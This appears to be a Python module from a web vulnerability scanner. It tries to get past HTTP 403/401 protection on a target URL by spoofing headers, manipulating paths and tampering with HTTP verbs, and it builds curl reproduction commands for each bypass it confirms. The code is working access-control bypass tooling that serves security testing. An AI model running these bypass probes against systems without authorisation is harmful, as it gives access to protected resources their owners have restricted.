"""HTTP 403 Forbidden bypass module.

Attempts to reach a 403-protected URL via:
  1. Header spoofing  -- X-Original-URL, X-Forwarded-For, X-Real-IP, etc.
  2. Path manipulation -- double slash, semicolon, encoded chars, trailing dot
  3. HTTP verb bypass  -- HEAD, OPTIONS, POST on GET-blocked paths

A bypass is confirmed when the technique returns 2xx where the baseline was 403.
The module runs once per URL regardless of how many parameters exist.
"""

import concurrent.futures
import re
import urllib.parse
from typing import Dict, List, Optional, Tuple

from .base import BaseModule, Finding

# Phrases that indicate a 200 response is still an error/denial page,
# not a successful bypass.  Common in WAFs that return 200 with custom
# "access denied" HTML rather than a proper 403 status code.
_DENIAL_RE = re.compile(
    r"access[\s\-]?denied|you are not authorized|not authorized|"
    r"permission denied|403 forbidden|blocked by|security check",
    re.IGNORECASE,
)

# ---------------------------------------------------------------------------
# Bypass techniques
# ---------------------------------------------------------------------------

# (technique_name, {header: value} override, path_transform_fn_or_None, method_override_or_None)
# path_transform receives (parsed_url) -> new_url_string

def _pt(parsed, new_path: str) -> str:
    """Reconstruct URL with a replaced path."""
    return urllib.parse.urlunparse(parsed._replace(path=new_path))


_HEADER_BYPASSES: List[Tuple[str, Dict[str, str]]] = [
    ("X-Original-URL",            {"X-Original-URL": "{path}"}),
    ("X-Rewrite-URL",             {"X-Rewrite-URL": "{path}"}),
    ("X-Forwarded-For-127",       {"X-Forwarded-For": "127.0.0.1"}),
    ("X-Remote-IP-127",           {"X-Remote-IP": "127.0.0.1"}),
    ("X-Client-IP-127",           {"X-Client-IP": "127.0.0.1"}),
    ("X-Custom-IP-Authorization", {"X-Custom-IP-Authorization": "127.0.0.1"}),
    ("X-Host-localhost",          {"X-Host": "localhost"}),
    ("X-Originating-IP",          {"X-Originating-IP": "127.0.0.1"}),
    ("Forwarded-header",          {"Forwarded": "for=127.0.0.1"}),
    ("X-ProxyUser-Ip",            {"X-ProxyUser-Ip": "127.0.0.1"}),
]

# (technique_name, path_transform_fn(parsed) -> new_url)
_PATH_BYPASSES: List[Tuple[str, callable]] = [
    ("trailing-slash",    lambda p: _pt(p, p.path + "/")),
    ("double-slash",      lambda p: _pt(p, "/" + p.path.lstrip("/")[:0] + "/" + p.path.lstrip("/"))),
    ("dot-slash",         lambda p: _pt(p, "/." + p.path)),
    ("slash-dot-slash",   lambda p: _pt(p, p.path.rstrip("/") + "/.")),
    ("semicolon-bypass",  lambda p: _pt(p, p.path + ";")),
    ("encoded-slash",     lambda p: _pt(p, p.path.replace("/", "%2F", 1))),
    ("encoded-dot",       lambda p: _pt(p, "/%2e" + p.path)),
    ("trailing-space",    lambda p: _pt(p, p.path + "%20")),
    ("trailing-tab",      lambda p: _pt(p, p.path + "%09")),
    ("case-upper",        lambda p: _pt(p, p.path.upper())),
    ("null-byte",         lambda p: _pt(p, p.path + "%00.html")),
    ("double-url-encode", lambda p: _pt(p, p.path.replace("/", "%252F", 1))),
]

_VERB_BYPASSES: List[str] = ["HEAD", "OPTIONS", "POST", "PATCH", "PUT"]


def _is_bypass(original_status: int, resp) -> bool:
    """True if response indicates the block was genuinely bypassed.

    Guards against WAFs/CDNs that return HTTP 200 with an "access denied"
    HTML body (custom error pages), or near-empty responses that are just
    quirks of the server rather than real content access.
    """
    if original_status not in (403, 401):
        return False
    if resp.status_code not in (200, 201, 204):
        return False
    body = resp.text or ""
    # Very short body on a 200 is likely a server quirk, not real access
    if resp.status_code == 200 and len(body) < 100:
        return False
    # Body contains denial language → still blocked, just with wrong status code
    if _DENIAL_RE.search(body[:3000]):
        return False
    return True


class Bypass403Scanner(BaseModule):
    """Attempt to bypass HTTP 403/401 protection on the target URL.

    Runs once per URL (deduped on the first sorted parameter name) so it
    doesn't repeat per-param.  Immediately returns ``[]`` if the baseline
    response is not 403/401.
    """

    NAME = "bypass403"

    def scan_parameter(
        self,
        url: str,
        method: str,
        params: Dict[str, str],
        param_name: str,
    ) -> List[Finding]:
        # Deduplicate: run once per URL by anchoring to the first param
        sorted_params = sorted(params.keys())
        if sorted_params and param_name != sorted_params[0]:
            return []

        # Baseline check
        baseline = self.http.get(url, params=params)
        if baseline is None or baseline.status_code not in (401, 403):
            return []

        blocked_status = baseline.status_code
        parsed = urllib.parse.urlparse(url)
        path = parsed.path or "/"

        findings: List[Finding] = []
        self._seen: set = set()

        # --- Strategy 1: header spoofing ---
        for name, header_template in _HEADER_BYPASSES:
            headers = {
                k: v.replace("{path}", path)
                for k, v in header_template.items()
            }
            resp = self.http.get(url, params=params, headers=headers)
            if resp is not None and _is_bypass(blocked_status, resp):
                f = self._make_finding(
                    url, method, params, blocked_status, resp.status_code,
                    f"Header: {headers}",
                    f"Added header: {headers}",
                    _header_repro(url, params, headers),
                )
                if f:
                    findings.append(f)
                    break

        if findings:
            return findings

        # --- Strategy 2: path manipulation (parallel) ---
        def _path_probe(name_fn):
            pname, pfn = name_fn
            try:
                new_url = pfn(parsed)
            except Exception:
                return None
            resp = self.http.get(new_url, params=params)
            if resp is not None and _is_bypass(blocked_status, resp):
                return (pname, new_url, resp.status_code)
            return None

        with concurrent.futures.ThreadPoolExecutor(max_workers=6) as exe:
            futs = [exe.submit(_path_probe, nf) for nf in _PATH_BYPASSES]
            for fut in concurrent.futures.as_completed(futs):
                result = fut.result()
                if result:
                    pname, new_url, sc = result
                    f = self._make_finding(
                        url, method, params, blocked_status, sc,
                        f"Path: {pname}",
                        f"Rewritten path: {new_url}",
                        _path_repro(new_url, params),
                    )
                    if f:
                        findings.append(f)

        if findings:
            return findings

        # --- Strategy 3: HTTP verb bypass ---
        for verb in _VERB_BYPASSES:
            resp = self.http._request(verb, url, params=params)
            if resp is not None and _is_bypass(blocked_status, resp):
                f = self._make_finding(
                    url, method, params, blocked_status, resp.status_code,
                    f"Verb: {verb}",
                    f"HTTP verb changed to {verb}",
                    _verb_repro(url, params, verb),
                )
                if f:
                    findings.append(f)
                    break

        return findings

    def _make_finding(
        self,
        url: str,
        method: str,
        params: Dict[str, str],
        blocked: int,
        bypassed: int,
        technique: str,
        detail_extra: str,
        repro: str,
    ) -> Optional[Finding]:
        key = (url, technique)
        if key in self._seen:
            return None
        self._seen.add(key)
        return Finding(
            vuln_type="403 Bypass",
            url=url,
            method=method,
            parameter="(URL path)",
            payload=technique,
            evidence=(
                f"HTTP {blocked} -> HTTP {bypassed} via {technique}"
            ),
            confidence="high",
            details=(
                f"Access control bypass detected on {url}. "
                f"Original HTTP {blocked} response was bypassed to "
                f"HTTP {bypassed} using: {detail_extra}. "
                "An attacker may access protected resources without authorization."
            ),
            reproduction=repro,
        )


# ---------------------------------------------------------------------------
# Reproduction step builders
# ---------------------------------------------------------------------------

def _qs(params: Dict[str, str]) -> str:
    return ("?" + urllib.parse.urlencode(params)) if params else ""


def _header_repro(url: str, params: Dict[str, str], headers: Dict[str, str]) -> str:
    qs = _qs(params)
    hdrs = " ".join(f'-H "{k}: {v}"' for k, v in headers.items())
    return (
        f"# Bypass via header injection:\n"
        f'$ curl -s {hdrs} "{url}{qs}"\n\n'
        f"# Try all common bypasses:\n"
        f'$ for h in "X-Original-URL: /" "X-Forwarded-For: 127.0.0.1" '
        f'"X-Real-IP: 127.0.0.1" "X-Custom-IP-Authorization: 127.0.0.1"; do\n'
        f'    echo "--- $h"; curl -s -H "$h" "{url}{qs}" -o /dev/null -w "%{{http_code}}\\n"\n'
        f"done"
    )


def _path_repro(new_url: str, params: Dict[str, str]) -> str:
    qs = _qs(params)
    return (
        f"# Bypass via path manipulation:\n"
        f'$ curl -s "{new_url}{qs}"\n\n'
        f"# Try other path variants:\n"
        f"$ for path in '/;/' '/%2e/' '/./' '//' '/%20'; do\n"
        f'    base="{new_url.rsplit("/", 1)[0]}"\n'
        f'    echo "--- ${{base}}${{path}}"; '
        f'curl -s "${{base}}${{path}}" -o /dev/null -w "%{{http_code}}\\n"\n'
        f"done"
    )


def _verb_repro(url: str, params: Dict[str, str], verb: str) -> str:
    qs = _qs(params)
    return (
        f"# Bypass via HTTP verb tampering:\n"
        f'$ curl -s -X {verb} "{url}{qs}"\n\n'
        f"# Try all verbs:\n"
        f'$ for v in HEAD OPTIONS POST PATCH PUT CONNECT; do\n'
        f'    echo "--- $v"; curl -s -X "$v" "{url}{qs}" -o /dev/null -w "%{{http_code}}\\n"\n'
        f"done"
    )
